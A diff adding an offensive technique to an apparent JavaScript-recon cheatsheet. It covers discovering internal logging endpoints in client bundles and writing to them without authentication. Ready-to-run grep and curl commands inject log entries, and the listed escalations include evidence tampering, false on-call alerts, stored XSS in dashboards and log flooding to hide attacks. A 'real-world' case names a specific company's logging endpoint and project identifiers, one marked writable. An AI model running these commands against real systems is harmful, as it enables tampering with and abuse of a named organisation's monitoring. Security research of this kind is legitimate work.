@@ -951,6 +951,53 @@ grep -oE '(method:"(get|post|put|patch|delete)".*?url:"[^"]+"|url:"[^"]+".*?meth
 
 ## Quick One-Liner Cheatsheet
 
+### Internal Logging/Telemetry Service Exploitation (NELO Pattern)
+
+Client-side JS bundles often contain hardcoded logging service endpoints and project identifiers. Unlike analytics (Sentry, Datadog) where tokens are read-only, some internal logging services accept arbitrary WRITES from anyone who knows the project name.
+
+**Discovery:**
+```bash
+# Find logging/telemetry endpoints in JS bundles
+grep -rhoP '(nelo|logstash|fluentd|loki|elastic|kibana|splunk|log[_-]?server)[^"'\''`]{0,100}' *.js
+grep -rhoP 'https?://[^\s"'\''<>]+(_store|/logs|/ingest|/collect|/track)' *.js
+
+# Find project names/identifiers
+grep -rhoP '(projectName|project_name|projectId|project_id|logSource)["\s:]+["'\''`]([^"'\''`]+)' *.js
+
+# NELO-specific (Naver internal logging)
+grep -rhoP '["\x27]P[0-9a-f]+_[a-z_]+["\x27]' *.js
+grep -rhoP 'nelo\.navercorp\.com[^"'\''`]*' *.js
+```
+
+**Exploitation (once endpoint + project name found):**
+```bash
+# Test if the project accepts unauthenticated writes
+curl -s -X POST "https://<nelo-endpoint>/_store" \
+  -H "Content-Type: application/json" \
+  -d '[{"projectName":"<project_id>","projectVersion":"1.0.0","logSource":"test","logLevel":"info","body":"auth_test"}]'
+
+# Success: {"code":200,"message":"Success"}
+# Fail: {"code":400,"message":"...Invalid project. Please register project and use valid projectKey..."}
+```
+
+**Impact escalation:**
+- `info` level: log pollution, evidence tampering
+- `fatal` level: trigger PagerDuty/on-call alerts (social engineering via ops)
+- XSS in body: potential stored XSS in internal monitoring dashboards
+- Bulk injection: log DoS, hide real attacks in noise
+
+**Real-world (LINE WORKS, June 2026):**
+- JS bundle at `cxtalk-service.line-works.com/jp1/dist/history/history.main-*.js` (2MB)
+- 4 NELO project names discovered: P6349d1_cstalk_connect (WRITABLE), P84f543_cstalk_userdata, P95625c_cstalk_jserror, P275bc3_cstalk_pageload
+- Endpoint: `jp-col-ext.nelo.navercorp.com/_store` (publicly accessible)
+- All log levels accepted, bulk injection works, no rate limiting
+
+**Key insight:** When you find a logging endpoint in JS, test EACH project name separately — some require auth tokens while others don't. The project-level auth is independent per project.
+
+---
+
+## Quick One-Liner Cheatsheet
+
 ```bash
 # Full pipeline: fetch → extract → deduplicate
 echo "https://target.com" | getJS --complete | \
